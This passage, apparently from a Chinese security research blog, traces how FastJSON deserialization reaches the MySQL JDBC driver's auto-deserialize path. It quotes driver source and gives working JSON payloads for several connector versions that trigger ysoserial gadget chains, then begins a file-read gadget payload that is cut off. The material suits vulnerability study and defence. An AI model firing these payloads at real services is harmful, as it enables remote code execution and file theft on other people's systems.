class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getObjectDeserializingIfNeeded</span><span class="hljs-params">(<span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.fields[columnIndex - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//field.isBinary() &amp;&amp; field.isBlob()进入</span><br>        <span class="hljs-type">byte</span>[] data = <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.connection.getAutoDeserialize()) &#123;<br>            <span class="hljs-keyword">return</span> data;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> data;<br>            <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span> &amp;&amp; data.length &gt;= <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-comment">//data[0] != -84 || data[1] != -19 则表明data不为java类序列化后字节码</span><br>                <span class="hljs-keyword">if</span> (data[<span class="hljs-number">0</span>] != -<span class="hljs-number">84</span> || data[<span class="hljs-number">1</span>] != -<span class="hljs-number">19</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getString(columnIndex);<br>                &#125;<br><span class="hljs-comment">//为java序列号字节码则进行反序列化</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytesIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);<br>                    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytesIn);<br>                    obj = objIn.readObject();<br>                    objIn.close();<br>                    bytesIn.close();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var7) &#123;<br>                    <span class="hljs-keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="hljs-string">&quot;ResultSet.Class_not_found___91&quot;</span>) + var7.toString() + Messages.getString(<span class="hljs-string">&quot;ResultSet._while_reading_serialized_object_92&quot;</span>), <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var8) &#123;<br>                    obj = data;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>5.1.41版本后，不再使用getObject()获取”SHOW COLLATION”的结果，此链失效</p><p><img src="/image/image-20220916154732110-16633144539751.png" alt="image-20220916154732110"></p><p>ServerStatusDiffInterceptor链：</p><p>ServerStatusDiffInterceptor是一个拦截器，在JDBC URL中设置属性queryInterceptors为ServerStatusDiffInterceptor时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法，进而调用 getObject () 方法。</p><p>ServerStatusDiffInterceptor#postProcess()方法和populateMapWithSessionStatusValues()方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//执行查询语句自动执行此方法</span><br><span class="hljs-keyword">public</span> ResultSetInternalMethods <span class="hljs-title function_">postProcess</span><span class="hljs-params">(String sql, Statement interceptedStatement, ResultSetInternalMethods originalResultSet, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">if</span> (connection.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.populateMapWithSessionStatusValues(connection, <span class="hljs-built_in">this</span>.postExecuteValues);<br>        connection.getLog().logInfo(<span class="hljs-string">&quot;Server status change for statement:\n&quot;</span> + Util.calculateDifferences(<span class="hljs-built_in">this</span>.preExecuteValues, <span class="hljs-built_in">this</span>.postExecuteValues));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">//执行postProcess()进而执行populateMapWithSessionStatusValues()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">populateMapWithSessionStatusValues</span><span class="hljs-params">(Connection connection, Map&lt;String, String&gt; toPopulate)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    java.sql.<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        toPopulate.clear();<br>        stmt = connection.createStatement();<br>        rs = stmt.executeQuery(<span class="hljs-string">&quot;SHOW SESSION STATUS&quot;</span>);<br>        Util.resultSetToMap(toPopulate, rs);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (rs != <span class="hljs-literal">null</span>) &#123;<br>            rs.close();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (stmt != <span class="hljs-literal">null</span>) &#123;<br>            stmt.close();<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>com.mysql.jdbc.Util#resultSetToMap()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>        mappedValues.put(rs.getObject(<span class="hljs-number">1</span>), rs.getObject(<span class="hljs-number">2</span>));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行rs.getObject()后执行逻辑与detectCustomCollations链中getObject()执行逻辑相同，进行反序列化</p><p>FastJSON-JDBC调用链</p><p>如上所述当  JSON串为 {“@type”:”java.lang.AutoCloseable”, “@type”: “com.mysql.jdbc.JDBC4Connection”}会调用至com.mysql.jdbc.JDBC4Connection的构造方法</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs qml">public JDBC4Connection(<span class="hljs-built_in">String</span> hostToConnectTo, <span class="hljs-built_in">int</span> portToConnectTo, Properties info, <span class="hljs-built_in">String</span> databaseToConnectTo, <span class="hljs-built_in">String</span> <span class="hljs-built_in">url</span>) throws <span class="hljs-title">SQLException</span> &#123;<br>    <span class="hljs-keyword">super</span>(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, <span class="hljs-built_in">url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>进而调用com.mysql.jdbc.ConnectionImpl#ConnectionImpl(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url)构造方法中this.createNewIO(false);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-built_in">this</span>.dbmd = <span class="hljs-built_in">this</span>.getMetaData(<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">this</span>.initializeSafeStatementInterceptors();<br>    <span class="hljs-built_in">this</span>.createNewIO(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">this</span>.unSafeStatementInterceptors();<br></code></pre></td></tr></table></figure><p>com.mysql.jdbc.ConnectionImpl#createNewIO(boolean isForReconnect)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createNewIO</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isForReconnect)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.getConnectionMutex()) &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">mergedProps</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.exposeAsProperties(<span class="hljs-built_in">this</span>.props);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.getHighAvailability()) &#123;<br>            <span class="hljs-built_in">this</span>.connectOneTryOnly(isForReconnect, mergedProps);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.connectWithRetries(isForReconnect, mergedProps);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用至ConnectionImpl#connectOneTryOnly()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connectOneTryOnly</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isForReconnect, Properties mergedProps)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Exception</span> <span class="hljs-variable">connectionNotEstablishedBecause</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">this</span>.coreConnect(mergedProps);<br>        <span class="hljs-built_in">this</span>.connectionId = <span class="hljs-built_in">this</span>.io.getThreadId();<br>        <span class="hljs-built_in">this</span>.isClosed = <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">oldAutoCommit</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getAutoCommit();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">oldIsolationLevel</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.isolationLevel;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">oldReadOnly</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.isReadOnly(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">oldCatalog</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getCatalog();<br>        <span class="hljs-built_in">this</span>.io.setStatementInterceptors(<span class="hljs-built_in">this</span>.statementInterceptors);<br>        <span class="hljs-built_in">this</span>.initializePropsFromServer();<br>        <span class="hljs-keyword">if</span> (isForReconnect) &#123;<br>            <span class="hljs-built_in">this</span>.setAutoCommit(oldAutoCommit);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.hasIsolationLevels) &#123;<br>                <span class="hljs-built_in">this</span>.setTransactionIsolation(oldIsolationLevel);<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.setCatalog(oldCatalog);<br>            <span class="hljs-built_in">this</span>.setReadOnly(oldReadOnly);<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>        <span class="hljs-keyword">if</span> (!(var8 <span class="hljs-keyword">instanceof</span> SQLException) || ((SQLException)var8).getErrorCode() != <span class="hljs-number">1820</span> || <span class="hljs-built_in">this</span>.getDisconnectOnExpiredPasswords()) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.io != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-built_in">this</span>.io.forceClose();<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (var8 <span class="hljs-keyword">instanceof</span> SQLException) &#123;<br>                <span class="hljs-keyword">throw</span> (SQLException)var8;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">SQLException</span> <span class="hljs-variable">chainedEx</span> <span class="hljs-operator">=</span> SQLError.createSQLException(Messages.getString(<span class="hljs-string">&quot;Connection.UnableToConnect&quot;</span>), <span class="hljs-string">&quot;08001&quot;</span>, <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>                chainedEx.initCause(var8);<br>                <span class="hljs-keyword">throw</span> chainedEx;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用至ConnectionImpl#initializePropsFromServer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializePropsFromServer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">connectionInterceptorClasses</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getConnectionLifecycleInterceptors();<br>    <span class="hljs-built_in">this</span>.connectionLifecycleInterceptors = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (connectionInterceptorClasses != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.connectionLifecycleInterceptors = Util.loadExtensions(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.props, connectionInterceptorClasses, <span class="hljs-string">&quot;Connection.badLifecycleInterceptor&quot;</span>, <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.setSessionVariables();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.setTransformedBitIsBoolean(<span class="hljs-literal">false</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.parserKnowsUnicode = <span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getUseServerPreparedStmts() &amp;&amp; <span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.useServerPreparedStmts = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &amp;&amp; !<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)) &#123;<br>            <span class="hljs-built_in">this</span>.useServerPreparedStmts = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    String characterSetResultsOnServerMysql;<br>    String sqlModeAsString;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">3</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.loadServerVariables();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) &#123;<br>            <span class="hljs-built_in">this</span>.autoIncrementIncrement = <span class="hljs-built_in">this</span>.getServerVariableAsInt(<span class="hljs-string">&quot;auto_increment_increment&quot;</span>, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.autoIncrementIncrement = <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.buildCollationMapping();<br>        <span class="hljs-type">int</span> i;<br>        ……<br></code></pre></td></tr></table></figure><p>调用至ConnectionImpl#buildCollationMapping()</p><p><img src="/image/453d3967-f666-4285-9ca6-cddbf1138006.png" alt="image-20220920161458418"></p><p>最后调用至ResultSetImpl#getObject()，后进行反序列化造成代码执行。</p><p>payload   5.1.11-5.1.48</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CommonsCollections5&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 利用链</span><br>        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;statementInterceptors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;NUM_HOSTS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;databaseToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/image/1b038b17-718e-4d17-8c91-0598bb759995.png" alt="image-20220920152603206"></p><p>payload 6.0.2&#x2F;6.0.3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span>,<br>        <span class="hljs-string">&quot;proxy&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;connectionString&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span><br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LoadBalancedMySQLConnection</span><span class="hljs-params">(LoadBalancedConnectionProxy proxy)</span> &#123;<br>    <span class="hljs-built_in">super</span>(proxy);<br>&#125;<br></code></pre></td></tr></table></figure><p>LoadBalancedConnectionProxy构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LoadBalancedConnectionProxy</span><span class="hljs-params">(ConnectionString connectionString)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    ......<br>    <span class="hljs-built_in">this</span>.pickNewConnection();<br>&#125;<br></code></pre></td></tr></table></figure><p>然后用pickNewConnection()建立连接，最终造成反序列化</p><p>6.0.4中构造方法改变，此利用链无法使用</p><p>payload 8.0.19</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,<br>        <span class="hljs-string">&quot;proxy&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,<br>            <span class="hljs-string">&quot;connectionUrl&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>,<br>                <span class="hljs-string">&quot;masters&quot;</span>:[&#123;<br>            <span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>        &#125;],<br>        <span class="hljs-string">&quot;slaves&quot;</span>:[],<br>        <span class="hljs-string">&quot;properties&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;yso_CommonsCollections4_calc&quot;</span>,<br>                    <span class="hljs-string">&quot;dbname&quot;</span>:<span class="hljs-string">&quot;dbname&quot;</span>,<br>                    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;pass&quot;</span>,<br>                    <span class="hljs-string">&quot;queryInterceptors&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<br>                    <span class="hljs-string">&quot;autoDeserialize&quot;</span>:<span class="hljs-string">&quot;true&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="Gadget2-文件写入读取"><a href="#Gadget2-文件写入读取" class="headerlink" title="Gadget2:文件写入读取"></a>Gadget2:文件写入读取</h6><p>payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;abc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;file:///D:/1.txt&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span 